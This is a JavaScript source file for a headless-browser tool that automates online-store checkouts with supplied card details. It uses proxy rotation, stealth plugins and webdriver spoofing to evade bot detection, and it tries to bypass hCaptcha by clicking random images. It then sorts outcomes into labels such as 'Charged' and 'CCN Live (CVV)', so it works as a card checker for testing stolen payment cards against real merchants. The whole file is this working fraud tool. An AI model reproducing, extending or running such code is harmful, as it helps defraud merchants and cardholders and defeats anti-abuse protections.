/**
 * Fast Browser-Based Checkout with CAPTCHA Bypass
 * Optimized for speed while still appearing human-like
 */

import puppeteer from 'puppeteer-extra';
import StealthPlugin from 'puppeteer-extra-plugin-stealth';
import { executablePath } from 'puppeteer';

puppeteer.use(StealthPlugin());

class BrowserCaptchaSolver {
    constructor(options = {}) {
        this.domain = options.domain;
        this.actualDomain = null;
        this.card = options.card || {};
        this.profile = options.profile || {};
        this.address = options.address || {};
        this.headless = options.headless !== false;
        this.timeout = options.timeout || 60000;
        this.variantId = options.variantId || null;
        this.proxy = options.proxy || null;
        this.proxyDetails = null;
        this.browser = null;
        this.page = null;
        
        if (this.proxy) {
            this.proxyDetails = this.parseProxy(this.proxy);
        }
    }

    parseProxy(proxyString) {
        if (!proxyString) return null;
        let cleanProxy = proxyString.trim().replace(/[@\}\{\[\]!#$%^&*()+=<>?\/"'\\]+$/, '').replace(/:{2,}/g, ':').replace(/\s/g, '').replace(/:$/, '').replace(/@$/, '');
        
        if (cleanProxy.includes('@')) {
            const [first, second] = cleanProxy.split('@');
            const fp = first.split(':'), sp = second.split(':');
            if (this.isValidHost(fp[0]) && !isNaN(fp[1])) return { host: fp[0], port: fp[1], username: sp[0], password: sp[1] };
            if (this.isValidHost(sp[0]) && !isNaN(sp[1])) return { host: sp[0], port: sp[1], username: fp[0], password: fp[1] };
        }
        
        const parts = cleanProxy.split(':');
        if (parts.length === 4) {
            if (this.isValidHost(parts[0]) && !isNaN(parts[1])) return { host: parts[0], port: parts[1], username: parts[2], password: parts[3] };
            if (this.isValidHost(parts[2]) && !isNaN(parts[3])) return { host: parts[2], port: parts[3], username: parts[0], password: parts[1] };
        }
        if (parts.length === 2) return { host: parts[0], port: parts[1], username: null, password: null };
        return null;
    }
    
    isValidHost(str) {
        return /^(\d{1,3}\.){3}\d{1,3}$/.test(str) || /^[a-zA-Z0-9][a-zA-Z0-9\-\.]*$/.test(str);
    }

    getDomain() { return this.actualDomain || this.domain; }

    // Fast delay - minimal
    async fastDelay(ms = 50) { await new Promise(r => setTimeout(r, ms)); }

    // Quick type - no delays
    async quickType(selector, text, frame = null) {
        const target = frame || this.page;
        try {
            await target.waitForSelector(selector, { visible: true, timeout: 3000 });
            await target.click(selector);
            await target.type(selector, text, { delay: 0 });
            return true;
        } catch { return false; }
    }

    // Quick click
    async quickClick(selector, frame = null) {
        const target = frame || this.page;
        try {
            await target.waitForSelector(selector, { visible: true, timeout: 3000 });
            await target.click(selector);
            return true;
        } catch { return false; }
    }

    async initBrowser() {
        const args = [
            '--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage',
            '--disable-gpu', '--window-size=1366,768', '--disable-blink-features=AutomationControlled'
        ];
        if (this.proxyDetails) args.push(`--proxy-server=${this.proxyDetails.host}:${this.proxyDetails.port}`);

        this.browser = await puppeteer.launch({
            headless: 'new',
            executablePath: executablePath(),
            args,
            defaultViewport: { width: 1366, height: 768 }
        });

        this.page = await this.browser.newPage();
        if (this.proxyDetails?.username) {
            await this.page.authenticate({ username: this.proxyDetails.username, password: this.proxyDetails.password });
        }

        await this.page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
        await this.page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', { get: () => false });
        });
    }

    async goToCheckout(variantId) {
        await this.page.goto(`https://${this.getDomain()}/cart/${variantId}:1`, { waitUntil: 'domcontentloaded', timeout: 15000 });
        
        // Quick redirect check
        if (!this.page.url().includes('checkout')) {
            try {
                await this.quickClick('[name="checkout"], button[type="submit"]');
                await this.page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 8000 }).catch(() => {});
            } catch {}
        }
        return this.page.url().includes('checkout');
    }

    async fillContactInfo() {
        // All fields in parallel where possible
        const email = this.profile.email || `test${Date.now()}@gmail.com`;
        const firstName = this.profile.firstName || 'John';
        const lastName = this.profile.lastName || 'Smith';
        const address = this.address.street || '123 Main St';
        const city = this.address.city || 'New York';
        const zip = this.address.postcode || '10001';

        // Try multiple selectors quickly
        await this.quickType('#email, input[type="email"]', email);
        await this.quickType('#TextField0, input[name="firstName"]', firstName);
        await this.quickType('#TextField1, input[name="lastName"]', lastName);
        await this.quickType('#TextField2, input[name="address1"]', address);
        await this.quickType('#TextField3, input[name="city"]', city);
        
        // State dropdown
        try { await this.page.select('#Select1, select[name="zone"]', this.address.state || 'NY'); } catch {}
        
        await this.quickType('#TextField4, input[name="postalCode"]', zip);
    }

    async continueToPayment() {
        // Click continue buttons quickly
        for (let i = 0; i < 2; i++) {
            try {
                const btns = await this.page.$$('button[type="submit"]');
                for (const btn of btns) {
                    const text = await btn.evaluate(e => e.textContent.toLowerCase());
                    if (text.includes('continue') || text.includes('shipping') || text.includes('payment')) {
                        await btn.click();
                        await this.fastDelay(500);
                        break;
                    }
                }
            } catch {}
            
            // Select shipping if visible
            try {
                const radio = await this.page.$('.radio-wrapper input[type="radio"]');
                if (radio) await radio.click();
            } catch {}
            
            await this.fastDelay(300);
        }
    }

    async fillPaymentInfo() {
        await this.fastDelay(500);
        
        for (const frame of this.page.frames()) {
            const url = frame.url();
            if (url.includes('card-fields') || url.includes('shopifycs') || url.includes('vault')) {
                try {
                    // Card number
                    const cardNum = await frame.$('input[name="number"], #number');
                    if (cardNum) {
                        await cardNum.click();
                        await frame.type('input[name="number"], #number', this.card.number.replace(/\s/g, ''), { delay: 5 });
                    }
                    
                    // Expiry
                    const expiry = await frame.$('input[name="expiry"], #expiry');
                    if (expiry) {
                        await expiry.click();
                        await frame.type('input[name="expiry"], #expiry', `${this.card.month}/${this.card.year.slice(-2)}`, { delay: 5 });
                    }
                    
                    // CVV
                    const cvv = await frame.$('input[name="verification_value"], #verification_value');
                    if (cvv) {
                        await cvv.click();
                        await frame.type('input[name="verification_value"], #verification_value', this.card.cvv, { delay: 5 });
                    }
                    
                    // Name
                    const name = await frame.$('input[name="name"], #name');
                    if (name) {
                        await name.click();
                        await frame.type('input[name="name"], #name', this.card.name || 'John Smith', { delay: 5 });
                    }
                } catch (e) {}
            }
        }
    }

    async solveHCaptcha() {
        // Quick check for hCaptcha
        let captchaFrame = this.page.frames().find(f => f.url().includes('hcaptcha.com'));
        if (!captchaFrame) return true;

        console.log('[Browser] 🤖 Solving hCaptcha...');
        
        try {
            // Click checkbox
            const checkbox = await captchaFrame.$('#checkbox, .checkbox');
            if (checkbox) {
                await checkbox.click();
                await this.fastDelay(1500);
            }
            
            // Check for challenge
            let challengeFrame = this.page.frames().find(f => f.url().includes('hcaptcha') && f.url().includes('challenge'));
            
            if (challengeFrame) {
                // Try to solve challenge quickly
                for (let round = 0; round < 2; round++) {
                    const images = await challengeFrame.$$('.task-image, .image-wrapper, [class*="task"]');
                    if (images.length === 0) break;
                    
                    // Click 3-4 random images quickly
                    const clicks = Math.min(3 + Math.floor(Math.random() * 2), images.length);
                    const clicked = new Set();
                    
                    while (clicked.size < clicks) {
                        const idx = Math.floor(Math.random() * images.length);
                        if (!clicked.has(idx)) {
                            clicked.add(idx);
                            try { await images[idx].click(); } catch {}
                            await this.fastDelay(100);
                        }
                    }
                    
                    // Submit
                    await this.fastDelay(200);
                    const submit = await challengeFrame.$('.button-submit, button[type="submit"]');
                    if (submit) {
                        await submit.click();
                        await this.fastDelay(1500);
                    }
                    
                    // Check if solved
                    challengeFrame = this.page.frames().find(f => f.url().includes('hcaptcha') && f.url().includes('challenge'));
                    if (!challengeFrame) break;
                }
            }
            
            return !this.page.frames().some(f => f.url().includes('hcaptcha') && f.url().includes('challenge'));
        } catch (e) {
            return false;
        }
    }

    async submitOrder() {
        // Solve captcha if present
        await this.solveHCaptcha();
        
        // Click pay button
        const btns = await this.page.$$('button[type="submit"], #checkout-pay-button');
        for (const btn of btns) {
            try {
                const text = await btn.evaluate(e => e.textContent.toLowerCase());
                if (text.includes('pay') || text.includes('complete') || text.includes('place order')) {
                    await btn.click();
                    break;
                }
            } catch {}
        }
        
        // Quick wait for result
        await this.fastDelay(2000);
        
        // Check for captcha after submit
        if (this.page.frames().some(f => f.url().includes('hcaptcha.com'))) {
            await this.solveHCaptcha();
            // Try submit again
            try {
                const payBtn = await this.page.$('button[type="submit"]');
                if (payBtn) await payBtn.click();
                await this.fastDelay(2000);
            } catch {}
        }
        
        return this.getResult();
    }

    async getResult() {
        const url = this.page.url();
        const content = await this.page.content();
        
        if (url.includes('thank_you') || url.includes('thank-you') || url.includes('orders/')) {
            return { success: true, status: 'Charged', message: 'Order Confirmed', url };
        }
        
        if (content.includes('3D Secure') || content.includes('authentication') || url.includes('authenticate')) {
            return { success: false, status: '3DS', message: '3D Secure Required', url };
        }
        
        const patterns = [
            [/declined/i, 'Declined', 'Card Declined'],
            [/insufficient/i, 'Declined', 'Insufficient Funds'],
            [/expired/i, 'Declined', 'Expired Card'],
            [/cvv|cvc|security/i, 'Live', 'CCN Live (CVV)'],
            [/address|zip|postal/i, 'Live', 'CCN Live (AVS)'],
            [/captcha/i, 'Error', 'CAPTCHA Failed']
        ];
        
        for (const [pattern, status, message] of patterns) {
            if (pattern.test(content)) return { success: false, status, message, url };
        }
        
        // Check for error banner
        try {
            const err = await this.page.$('.notice--error, .field__message--error');
            if (err) {
                const text = await err.evaluate(e => e.textContent.trim());
                return { success: false, status: 'Error', message: text.substring(0, 80), url };
            }
        } catch {}
        
        return { success: false, status: 'Unknown', message: 'Result unclear', url };
    }

    async run() {
        const startTime = Date.now();
        
        try {
            await this.initBrowser();
            
            // Detect actual domain
            if (!this.actualDomain) {
                try {
                    await this.page.goto(`https://${this.domain}`, { waitUntil: 'domcontentloaded', timeout: 10000 });
                    const url = new URL(this.page.url());
                    if (url.hostname !== this.domain) this.actualDomain = url.hostname;
                } catch {}
            }
            
            await this.goToCheckout(this.variantId);
            await this.fillContactInfo();
            await this.continueToPayment();
            await this.fillPaymentInfo();
            
            const result = await this.submitOrder();
            result.time = `${((Date.now() - startTime) / 1000).toFixed(2)}s`;
            return result;
            
        } catch (error) {
            return { success: false, status: 'Error', message: error.message, time: `${((Date.now() - startTime) / 1000).toFixed(2)}s` };
        } finally {
            if (this.browser) await this.browser.close();
        }
    }
}

export default BrowserCaptchaSolver;
